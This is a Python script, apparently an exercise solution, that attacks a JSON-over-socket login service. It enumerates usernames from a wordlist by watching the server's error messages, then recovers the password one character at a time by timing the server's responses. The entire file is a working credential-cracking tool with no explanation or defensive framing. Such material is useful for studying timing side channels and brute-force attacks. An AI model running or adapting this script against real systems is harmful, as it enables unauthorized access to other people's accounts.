import socket
import sys
import json
import string
import time

user_socket = socket.socket()
adress = (sys.argv[1], int(sys.argv[2]))
user_socket.connect(adress)
user_login = {"login": '', "password": ' '}

def read_passwords():
    with open('ps.txt', 'rt', encoding='utf-8') as f:
        return f.readlines()

def hack_login():
    lines = read_passwords()
    lines = [n.strip("\n") for n in lines]
    login = ''
    for pas in lines:
        user_login['login'] = pas
        data = json.dumps(user_login)
        data = data.encode()
        user_socket.send(data)
        response = user_socket.recv(1024)
        response = json.loads(response.decode())
        if response["result"] == "Wrong password!":
            login = pas
            break
    return login

def hack_password():
    login = hack_login()
    valid_characters = list(string.ascii_letters + string.digits)
    password = ''
    while True:
        for char in valid_characters:
            user_login['login'] = login
            new_password = password + str(char)
            user_login['password'] = new_password
            data1 = json.dumps(user_login)
            data = data1.encode()
            time_start = time.perf_counter()
            user_socket.send(data)
            response = user_socket.recv(1024)
            response = json.loads(response.decode())
            time_end = time.perf_counter()
            total_time = time_end - time_start
            if response["result"] == "Connection success!":
                print(data1)
                exit()
            elif total_time >= 0.1:
                password += str(char)
                break

hack_password()
